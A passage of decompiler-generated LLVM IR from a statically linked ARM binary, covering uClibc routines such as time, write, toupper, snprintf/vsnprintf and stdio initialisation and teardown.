  store i32 %v0_143a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_143ac

dec_label_pc_143ac:                               ; preds = %dec_label_pc_14374, %dec_label_pc_143a8
  %v0_143ac = phi i32 [ %v0_143ac.pre, %dec_label_pc_14374 ], [ %v0_143a8, %dec_label_pc_143a8 ]
  %v2_143b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_143b0, i32* @r4, align 4
  ret i32 %v0_143ac

; uselistorder directives
  uselistorder i32 %v7_14388, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_143ac, { 1, 0 }
  uselistorder label %dec_label_pc_143a8, { 1, 0 }
  uselistorder label %dec_label_pc_14388, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_143b4 = load i32, i32* @r4, align 4
  store i32 %v3_143b4, i32* %stack_var_-8, align 4
  %v2_143b8 = call i32 @time(i32* %arg1)
  store i32 %v2_143b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_143b8, -4095
  br i1 %tmp, label %dec_label_pc_143d8, label %dec_label_pc_143c8

dec_label_pc_143c8:                               ; preds = %entry
  %v0_143c8 = call i32 @__errno_location()
  %v0_143cc = load i32, i32* %r4.global-to-local, align 4
  %v1_143cc = sub i32 0, %v0_143cc
  %v2_143d0 = inttoptr i32 %v0_143c8 to i32*
  store i32 %v1_143cc, i32* %v2_143d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %entry, %dec_label_pc_143c8
  %v0_143d8 = phi i32 [ %v2_143b8, %entry ], [ -1, %dec_label_pc_143c8 ]
  %v2_143dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_143dc, i32* @r4, align 4
  ret i32 %v0_143d8

; uselistorder directives
  uselistorder i32 %v2_143b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_143d8, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_143e4 = call i32 @wait4()
  ret i32 %v0_143e4
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_143e8 = load i32, i32* @r4, align 4
  store i32 %v3_143e8, i32* %stack_var_-8, align 4
  %v3_143ec = load i32, i32* @r2, align 4
  %v4_143ec = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_143ec)
  store i32 %v4_143ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_143ec, -4095
  br i1 %tmp, label %dec_label_pc_1440c, label %dec_label_pc_143fc

dec_label_pc_143fc:                               ; preds = %entry
  %v0_143fc = call i32 @__errno_location()
  %v0_14400 = load i32, i32* %r4.global-to-local, align 4
  %v1_14400 = sub i32 0, %v0_14400
  %v2_14404 = inttoptr i32 %v0_143fc to i32*
  store i32 %v1_14400, i32* %v2_14404, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1440c

dec_label_pc_1440c:                               ; preds = %entry, %dec_label_pc_143fc
  %v0_1440c = phi i32 [ %v4_143ec, %entry ], [ -1, %dec_label_pc_143fc ]
  %v2_14410 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14410, i32* @r4, align 4
  ret i32 %v0_1440c

; uselistorder directives
  uselistorder i32 %v4_143ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1440c, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_14418 = load i32, i32* @global_var_2b254, align 4
  %v3_1441c = mul i32 %arg1, 2
  %v4_1441c = add i32 %v2_14418, %v3_1441c
  %v5_1441c = inttoptr i32 %v4_1441c to i8*
  %v6_1441c = load i8, i8* %v5_1441c, align 1
  %v8_1441c = zext i8 %v6_1441c to i32
  %v1_14420 = and i32 %v8_1441c, 32
  ret i32 %v1_14420
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14434 = icmp slt i32 %arg1, 0
  br i1 %v1_14434, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_14434 = mul i32 %arg1, 2
  %v2_14440 = load i32, i32* @global_var_2b25c, align 4
  %v2_14444 = add i32 %v2_14440, %v2_14434
  %v3_14448 = inttoptr i32 %v2_14444 to i8*
  %v4_14448 = load i8, i8* %v3_14448, align 1
  %v6_14448 = zext i8 %v4_14448 to i32
  %v1_1444c = add i32 %v2_14444, 1
  %v2_1444c = inttoptr i32 %v1_1444c to i8*
  %v3_1444c = load i8, i8* %v2_1444c, align 1
  %v4_1444c = zext i8 %v3_1444c to i32
  %v3_14450 = mul nuw i32 %v4_1444c, 16777216
  %v4_14454 = sdiv i32 %v3_14450, 65536
  %v5_14454 = or i32 %v4_14454, %v6_14448
  ret i32 %v5_14454

; uselistorder directives
  uselistorder i32 %v2_14444, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_31820.1318 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-4, align 4
  %v2_144b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_144b4, i32* @ip, align 4
  store i32 %v2_144b4, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_144c4 = call i32 @__GI_vsnprintf()
  ret i32 %v0_144c4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_144e4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_144e4, i32* @ip, align 4
  store i32 %v2_144e4, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_144f8 = call i32 @__GI_vsnprintf()
  ret i32 %v0_144f8

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_1450c = load i32, i32* @r4, align 4
  %v6_1450c = load i32, i32* @r5, align 4
  %v12_1450c = load i32, i32* @r7, align 4
  %v15_1450c = load i32, i32* @r8, align 4
  %v18_1450c = load i32, i32* @sl, align 4
  %v0_14510 = load i32, i32* @r3, align 4
  store i32 %v0_14510, i32* @r8, align 4
  %v2_14514 = ptrtoint i32* %stack_var_-108 to i32
  %v0_1451c = load i32, i32* @r0, align 4
  %v1_1451c = sub i32 -1, %v0_1451c
  store i32 %v1_1451c, i32* @r5, align 4
  store i32 %v0_1451c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_14530 = load i32, i32* @r1, align 4
  %v3_14530 = icmp ult i32 %v1_1451c, %v1_14530
  br i1 %v3_14530, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_14530, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_14538 = load i32, i32* @r2, align 4
  store i32 %v0_14538, i32* @r7, align 4
  %v2_1453c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1453c, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_14558 = call i32 @__stdio_init_mutex()
  %v0_1455c = load i32, i32* @r4, align 4
  %v1_1455c = load i32, i32* @r5, align 4
  %v0_14564 = load i32, i32* @r7, align 4
  %v0_14568 = load i32, i32* @r8, align 4
  %v3_14588 = inttoptr i32 %v0_14564 to i8*
  %v4_14588 = call i32 @_vfprintf_internal(i32 %v2_14514, i8* %v3_14588, i32 %v0_14568)
  %v0_1458c = load i32, i32* @r5, align 4
  %v1_1458c = load i32, i32* @sl, align 4
  %v9_1458c = icmp eq i32 %v0_1458c, %v1_1458c
  br i1 %v9_1458c, label %dec_label_pc_145b4, label %dec_label_pc_14598

dec_label_pc_14598:                               ; preds = %bb23
  %v9_145a0 = icmp eq i32 %v1_1455c, 0
  %v1_145a4 = sext i1 %v9_145a0 to i32
  %v1_145a4.v0_14580 = add i32 %v0_1455c, %v1_145a4
  %stack_var_-92.0 = inttoptr i32 %v1_145a4.v0_14580 to i8*
  %v1_145b0 = trunc i32 %v1_1458c to i8
  store i8 %v1_145b0, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_145b4

dec_label_pc_145b4:                               ; preds = %bb23, %dec_label_pc_14598
  store i32 %v3_1450c, i32* @r4, align 4
  store i32 %v6_1450c, i32* @r5, align 4
  store i32 %v12_1450c, i32* @r7, align 4
  store i32 %v15_1450c, i32* @r8, align 4
  store i32 %v18_1450c, i32* @sl, align 4
  ret i32 %v4_14588

; uselistorder directives
  uselistorder i32 %v1_14530, { 1, 0 }
  uselistorder i32 %v0_1451c, { 1, 0 }
  uselistorder label %dec_label_pc_145b4, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_145bc = load i32, i32* @r4, align 4
  store i32 %v3_145bc, i32* %stack_var_-24, align 4
  %v9_145bc = load i32, i32* @r6, align 4
  %v0_145c0 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_2b2ac.1313 to i32), i32* @r4, align 4
  %v3_145c8 = load i8, i8* @global_var_2b2ad.1320, align 1
  %v4_145c8 = zext i8 %v3_145c8 to i32
  %v2_145cc = load i8, i8* bitcast (i8** @global_var_2b2ac.1313 to i8*), align 4
  %v3_145cc = zext i8 %v2_145cc to i32
  store i32 %v0_145c0, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_145d8 = mul nuw nsw i32 %v4_145c8, 256
  %v5_145d8 = or i32 %v3_145cc, %v4_145d8
  store i32 %v5_145d8, i32* @r6, align 4
  %v1_145dc = inttoptr i32 %v0_145c0 to i32*
  %v2_145dc = load i32, i32* %v1_145dc, align 4
  store i32 %v2_145dc, i32* %r8.global-to-local, align 4
  %v1_145e0 = call i32 @isatty(i32 0)
  %v1_145e4 = sub i32 1, %v1_145e0
  %v0_145e8 = load i32, i32* @r6, align 4
  %v4_145e8 = mul i32 %v1_145e4, 256
  %v5_145e8 = xor i32 %v4_145e8, %v0_145e8
  %v3_145ec = load i8, i8* @global_var_2b2fd.1321, align 1
  %v4_145ec = zext i8 %v3_145ec to i32
  %v3_145f0 = load i8, i8* @global_var_2b2fc.1314, align 1
  %v4_145f0 = zext i8 %v3_145f0 to i32
  %v3_145f4 = sdiv i32 %v5_145e8, 256
  store i32 1, i32* @r0, align 4
  %v4_145fc = mul nuw nsw i32 %v4_145ec, 256
  %v5_145fc = or i32 %v4_145f0, %v4_145fc
  store i32 %v5_145fc, i32* @r5, align 4
  %v1_14600 = trunc i32 %v3_145f4 to i8
  store i8 %v1_14600, i8* @global_var_2b2ad.1320, align 1
  %v1_14604 = trunc i32 %v0_145e8 to i8
  %v2_14604 = load i32, i32* @r4, align 4
  %v3_14604 = inttoptr i32 %v2_14604 to i8*
  store i8 %v1_14604, i8* %v3_14604, align 1
  %v1_14608 = call i32 @isatty(i32 1)
  %v1_1460c = sub i32 1, %v1_14608
  %v0_14610 = load i32, i32* @r5, align 4
  %v4_14610 = mul i32 %v1_1460c, 256
  %v5_14610 = xor i32 %v4_14610, %v0_14610
  store i32 %v5_14610, i32* %r5.global-to-local, align 4
  %v3_14614 = sdiv i32 %v5_14610, 256
  %v1_14618 = trunc i32 %v3_14614 to i8
  store i8 %v1_14618, i8* @global_var_2b2fd.1321, align 1
  %v0_1461c = load i32, i32* %r8.global-to-local, align 4
  %v1_1461c = load i32, i32* @r7, align 4
  %v2_1461c = inttoptr i32 %v1_1461c to i32*
  store i32 %v0_1461c, i32* %v2_1461c, align 4
  %v0_14620 = load i32, i32* %r5.global-to-local, align 4
  %v1_14620 = trunc i32 %v0_14620 to i8
  store i8 %v1_14620, i8* @global_var_2b2fc.1314, align 1
  %v2_14624 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14624, i32* @r4, align 4
  store i32 %v9_145bc, i32* @r6, align 4
  ret i32 %v1_1460c

; uselistorder directives
  uselistorder i32 %v1_1460c, { 1, 0 }
  uselistorder i32 %v0_145e8, { 1, 0 }
  uselistorder i8* @global_var_2b2fc.1314, { 1, 0 }
  uselistorder i8* @global_var_2b2fd.1321, { 1, 0 }
  uselistorder i8* @global_var_2b2ad.1320, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_21f6c.1323 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14634 = call i32 @memcpy()
  %v0_14638 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14638, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_14634

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1463c = load i32, i32* @r4, align 4
  store i32 %v3_1463c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2b278.1325 to i32), i32* @r0, align 4
  %v0_14644 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_2b290.1327 to i32), i32* @r0, align 4
  %v0_1464c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_2b274.1329 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_2b274.1329 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_146a86 = add i32 %storemerge5, 56
  store i32 %v1_146a86, i32* @r5, align 4
  %v2_146ac8 = icmp eq i32 %storemerge5, 0
  store i32 %v1_146a86, i32* %r0.global-to-local, align 4
  br i1 %v2_146ac8, label %dec_label_pc_146b8, label %dec_label_pc_1465c

dec_label_pc_1465c:                               ; preds = %entry, %dec_label_pc_14698
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r3.global-to-local, align 4
  store i32 83560, i32* @lr, align 4
  %v1_14664 = call i32 @__pthread_return_0()
  %v2_14668 = icmp eq i32 %v1_14664, 0
  %v0_1466c = load i32, i32* @r5, align 4
  store i32 %v0_1466c, i32* @r0, align 4
  br i1 %v2_14668, label %dec_label_pc_14698, label %dec_label_pc_14674

dec_label_pc_14674:                               ; preds = %dec_label_pc_1465c
  %v0_14674 = load i32, i32* @r4, align 4
  %v1_14674 = add i32 %v0_14674, 8
  %v2_14674 = inttoptr i32 %v1_14674 to i32*
  %v3_14674 = load i32, i32* %v2_14674, align 4
  store i32 %v3_14674, i32* %r3.global-to-local, align 4
  %v3_1467c = inttoptr i32 %v0_14674 to i8*
  store i8 48, i8* %v3_1467c, align 1
  %v2_14684 = load i32, i32* @r4, align 4
  %v3_14684 = add i32 %v2_14684, 1
  %v4_14684 = inttoptr i32 %v3_14684 to i8*
  store i8 0, i8* %v4_14684, align 1
  %v0_14688 = load i32, i32* %r3.global-to-local, align 4
  %v1_14688 = load i32, i32* @r4, align 4
  %v2_14688 = add i32 %v1_14688, 20
  %v3_14688 = inttoptr i32 %v2_14688 to i32*
  store i32 %v0_14688, i32* %v3_14688, align 4
  %v0_1468c = load i32, i32* %r3.global-to-local, align 4
  %v1_1468c = load i32, i32* @r4, align 4
  %v2_1468c = add i32 %v1_1468c, 24
  %v3_1468c = inttoptr i32 %v2_1468c to i32*
  store i32 %v0_1468c, i32* %v3_1468c, align 4
  %v0_14690 = load i32, i32* %r3.global-to-local, align 4
  %v1_14690 = load i32, i32* @r4, align 4
  %v2_14690 = add i32 %v1_14690, 28
  %v3_14690 = inttoptr i32 %v2_14690 to i32*
  store i32 %v0_14690, i32* %v3_14690, align 4
  %v0_14694 = load i32, i32* %r3.global-to-local, align 4
  %v1_14694 = load i32, i32* @r4, align 4
  %v2_14694 = add i32 %v1_14694, 16
  %v3_14694 = inttoptr i32 %v2_14694 to i32*
  store i32 %v0_14694, i32* %v3_14694, align 4
  br label %dec_label_pc_14698

dec_label_pc_14698:                               ; preds = %dec_label_pc_1465c, %dec_label_pc_14674
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_1469c = load i32, i32* @r4, align 4
  %v2_1469c = add i32 %v1_1469c, 52
  %v3_1469c = inttoptr i32 %v2_1469c to i32*
  store i32 1, i32* %v3_1469c, align 4
  %v0_146a0 = call i32 @__stdio_init_mutex()
  store i32 %v0_146a0, i32* %r0.global-to-local, align 4
  %v0_146a4 = load i32, i32* @r4, align 4
  %v1_146a4 = add i32 %v0_146a4, 32
  %v2_146a4 = inttoptr i32 %v1_146a4 to i32*
  %storemerge = load i32, i32* %v2_146a4, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_146a8 = add i32 %storemerge, 56
  store i32 %v1_146a8, i32* @r5, align 4
  %v2_146ac = icmp eq i32 %storemerge, 0
  store i32 %v1_146a8, i32* %r0.global-to-local, align 4
  br i1 %v2_146ac, label %dec_label_pc_146a8.dec_label_pc_146b8_crit_edge, label %dec_label_pc_1465c

dec_label_pc_146a8.dec_label_pc_146b8_crit_edge:  ; preds = %dec_label_pc_14698
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_2b274.1329 to i32*), align 4
  br label %dec_label_pc_146b8

dec_label_pc_146b8:                               ; preds = %dec_label_pc_146a8.dec_label_pc_146b8_crit_edge, %entry
  %v11_146e013 = phi i32 [ %v1_146a8, %dec_label_pc_146a8.dec_label_pc_146b8_crit_edge ], [ %v1_146a86, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_146a8.dec_label_pc_146b8_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_2b274.1329 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_146d84 = icmp eq i32 %storemerge12, 0
  br i1 %v2_146d84, label %dec_label_pc_146e0, label %dec_label_pc_146c4

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146b8, %dec_label_pc_146c4
  %v0_146cc = phi i32 [ %storemerge1, %dec_label_pc_146c4 ], [ %storemerge12, %dec_label_pc_146b8 ]
  %v1_146c4 = inttoptr i32 %v0_146cc to i8*
  %v2_146c4 = load i8, i8* %v1_146c4, align 1
  %v3_146c4 = zext i8 %v2_146c4 to i32
  store i32 %v3_146c4, i32* %r3.global-to-local, align 4
  %v1_146c8 = and i32 %v3_146c4, 64
  store i32 %v0_146cc, i32* %r0.global-to-local, align 4
  store i32 83668, i32* @lr, align 4
  %v1_146d0 = icmp ne i32 %v1_146c8, 0
  call void @__pseudo_cond_branch(i1 %v1_146d0, i32 ptrtoint (i32* @global_var_146f4.1332 to i32))
  %v0_146d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_146d4 = add i32 %v0_146d4, 32
  %v2_146d4 = inttoptr i32 %v1_146d4 to i32*
  %storemerge1 = load i32, i32* %v2_146d4, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_146d8 = icmp eq i32 %storemerge1, 0
  br i1 %v2_146d8, label %dec_label_pc_146d8.dec_label_pc_146e0_crit_edge, label %dec_label_pc_146c4

dec_label_pc_146d8.dec_label_pc_146e0_crit_edge:  ; preds = %dec_label_pc_146c4
  %v11_146e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146e0

dec_label_pc_146e0:                               ; preds = %dec_label_pc_146d8.dec_label_pc_146e0_crit_edge, %dec_label_pc_146b8
  %v11_146e0 = phi i32 [ %v11_146e0.pre, %dec_label_pc_146d8.dec_label_pc_146e0_crit_edge ], [ %v11_146e013, %dec_label_pc_146b8 ]
  %v2_146e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_146e0, i32* @r4, align 4
  ret i32 %v11_146e0

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_146c4, { 1, 0 }
  uselistorder label %dec_label_pc_14698, { 1, 0 }
  uselistorder label %dec_label_pc_1465c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_146f4 = load i32, i32* @r4, align 4
  store i32 %v3_146f4, i32* %stack_var_-8, align 4
  %v0_146f8 = load i32, i32* @r0, align 4
  %v1_146f8 = add i32 %v0_146f8, 8
  %v2_146f8 = inttoptr i32 %v1_146f8 to i32*
  %v3_146f8 = load i32, i32* %v2_146f8, align 4
  %v1_146fc = add i32 %v0_146f8, 16
  %v2_146fc = inttoptr i32 %v1_146fc to i32*
  %v3_146fc = load i32, i32* %v2_146fc, align 4
  %v9_14700 = icmp eq i32 %v3_146fc, %v3_146f8
  store i32 %v0_146f8, i32* %r4.global-to-local, align 4
  br i1 %v9_14700, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_146f8, i32* %v2_146fc, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 83732, i32* @lr, align 4
  %v1_14710 = xor i1 %v9_14700, true
  call void @__pseudo_cond_branch(i1 %v1_14710, i32 ptrtoint (i32* @global_var_17dc0.1333 to i32))
  %v0_14714 = load i32, i32* %r4.global-to-local, align 4
  %v1_14714 = add i32 %v0_14714, 8
  %v2_14714 = inttoptr i32 %v1_14714 to i32*
  %v3_14714 = load i32, i32* %v2_14714, align 4
  %v1_14718 = add i32 %v0_14714, 16
  %v2_14718 = inttoptr i32 %v1_14718 to i32*
  %v3_14718 = load i32, i32* %v2_14718, align 4
  %v2_1471c = sub i32 %v3_14718, %v3_14714
  %v2_14720 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14720, i32* @r4, align 4
  ret i32 %v2_1471c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_14728 = load i32, i32* @r0, align 4
  %v1_14728 = add i32 %v0_14728, 52
  %v2_14728 = inttoptr i32 %v1_14728 to i32*
  %v3_14728 = load i32, i32* %v2_14728, align 4
  store i32 %v3_14728, i32* @r8, align 4
  %v1_1472c = add i32 %v0_14728, 56
  store i32 %v1_1472c, i32* @r5, align 4
  %v2_14730 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14734 = icmp eq i32 %v3_14728, 0
  store i32 %v0_14728, i32* @r4, align 4
  %v0_1473c = load i32, i32* @r1, align 4
  store i32 %v0_1473c, i32* @r7, align 4
  %v0_14740 = load i32, i32* @r2, align 4
  store i32 %v0_14740, i32* @r6, align 4
  store i32 %v2_14730, i32* @r0, align 4
  br i1 %v2_14734, label %dec_label_pc_14754, label %dec_label_pc_14770

dec_label_pc_14754:                               ; preds = %entry
  %v1_1475c = call i32 @__pthread_return_void()
  store i32 83824, i32* @lr, align 4
  %v1_1476c = call i32 @__pthread_return_0()
  %v0_14770.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14770

dec_label_pc_14770:                               ; preds = %entry, %dec_label_pc_14754
  %v0_14780 = phi i32 [ %v0_14728, %entry ], [ %v0_14770.pre, %dec_label_pc_14754 ]
  %v1_14770 = inttoptr i32 %v0_14780 to i8*
  %v2_14770 = load i8, i8* %v1_14770, align 1
  %v2_14778 = icmp ugt i8 %v2_14770, -65
  br i1 %v2_14778, label %dec_label_pc_14798, label %dec_label_pc_14788

dec_label_pc_14788:                               ; preds = %dec_label_pc_14770
  %v3_14788 = call i32 @__stdio_trans2w_o(i8* %v1_14770, i32 128)
  %v2_1478c = icmp eq i32 %v3_14788, 0
  store i32 -1, i32* @r5, align 4
  br i1 %v2_1478c, label %dec_label_pc_14788.dec_label_pc_14798_crit_edge, label %dec_label_pc_147ac

dec_label_pc_14788.dec_label_pc_14798_crit_edge:  ; preds = %dec_label_pc_14788
  %v0_147a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14798

dec_label_pc_14798:                               ; preds = %dec_label_pc_14788.dec_label_pc_14798_crit_edge, %dec_label_pc_14770
  %v0_147a0 = phi i32 [ %v0_147a0.pre, %dec_label_pc_14788.dec_label_pc_14798_crit_edge ], [ %v0_14780, %dec_label_pc_14770 ]
  %v0_14798 = load i32, i32* @r7, align 4
  %v0_1479c = load i32, i32* @r6, align 4
  %v3_147a4 = inttoptr i32 %v0_14798 to i8*
  %v4_147a4 = call i32 @_vfprintf_internal(i32 %v0_147a0, i8* %v3_147a4, i32 %v0_1479c)
  store i32 %v4_147a4, i32* @r5, align 4
  br label %dec_label_pc_147ac

dec_label_pc_147ac:                               ; preds = %dec_label_pc_14788, %dec_label_pc_14798
  %v0_147c45 = phi i32 [ -1, %dec_label_pc_14788 ], [ %v4_147a4, %dec_label_pc_14798 ]
  %v0_147ac = load i32, i32* @r8, align 4
  %v2_147ac = icmp eq i32 %v0_147ac, 0
  br i1 %v2_147ac, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_147ac
  call void @__pseudo_branch(i32 95968)
  %v0_147c4.pre = load i32, i32* @r5, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_147ac, %bb
  %v0_147c4 = phi i32 [ %v0_147c45, %dec_label_pc_147ac ], [ %v0_147c4.pre, %bb ]
  ret i32 %v0_147c4

; uselistorder directives
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_147ac, { 1, 0 }
  uselistorder label %dec_label_pc_14770, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_147e0 = load i32, i32* @r4, align 4
  %v6_147e0 = load i32, i32* @r5, align 4
  %v9_147e0 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_148002 = icmp eq i32 %arg3, 0
  %v2_14804 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_148002, label %dec_label_pc_14820, label %dec_label_pc_14814

dec_label_pc_147fc:                               ; preds = %dec_label_pc_14814
  %v1_147fc = add i32 %v0_147fc, -1
  store i32 %v1_147fc, i32* @r4, align 4
  %v2_14800 = icmp eq i32 %v1_147fc, 0
  %v0_1480c = load i32, i32* @r6, align 4
  br i1 %v2_14800, label %dec_label_pc_14820.loopexit, label %dec_label_pc_14814

dec_label_pc_14814:                               ; preds = %entry, %dec_label_pc_147fc
  %v0_1480c4 = phi i32 [ %v0_1480c, %dec_label_pc_147fc ], [ %arg1, %entry ]
  %v3_14814 = call i32 @__stdio_fwrite(i32 %v2_14804, i32 1, i32 %v0_1480c4)
  %v7_14818 = icmp eq i32 %v3_14814, 1
  %v0_147fc = load i32, i32* @r4, align 4
  br i1 %v7_14818, label %dec_label_pc_147fc, label %dec_label_pc_14820.loopexit

dec_label_pc_14820.loopexit:                      ; preds = %dec_label_pc_147fc, %dec_label_pc_14814
  %v0_14820.ph = phi i32 [ %v0_147fc, %dec_label_pc_14814 ], [ 0, %dec_label_pc_147fc ]
  %v1_14820.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14820

dec_label_pc_14820:                               ; preds = %dec_label_pc_14820.loopexit, %entry
  %v1_14820 = phi i32 [ 0, %entry ], [ %v1_14820.pre, %dec_label_pc_14820.loopexit ]
  %v0_14820 = phi i32 [ 0, %entry ], [ %v0_14820.ph, %dec_label_pc_14820.loopexit ]
  %v2_14820 = sub i32 %v1_14820, %v0_14820
  store i32 %v3_147e0, i32* @r4, align 4
  store i32 %v6_147e0, i32* @r5, align 4
  store i32 %v9_147e0, i32* @r6, align 4
  ret i32 %v2_14820

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14820.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14814, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1482c = load i32, i32* @r4, align 4
  store i32 %v3_1482c, i32* %stack_var_-24, align 4
  %v9_1482c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
